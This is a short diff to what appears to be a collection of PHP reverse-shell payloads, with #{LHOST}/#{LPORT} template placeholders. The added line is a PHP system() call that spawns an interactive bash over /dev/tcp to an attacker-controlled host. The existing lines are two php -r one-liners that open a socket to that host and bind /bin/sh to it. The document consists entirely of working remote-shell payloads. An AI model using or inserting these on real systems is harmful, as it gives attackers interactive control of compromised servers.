@@ -1,3 +1,5 @@
+<?php system("bash -c 'bash -i >& /dev/tcp/#{LHOST}/#{LPORT} 0>&1'"); ?>
+
 php -r '$sock=fsockopen("#{LHOST}",#{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'
 
 php -r '$s=fsockopen("#{LHOST}",#{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
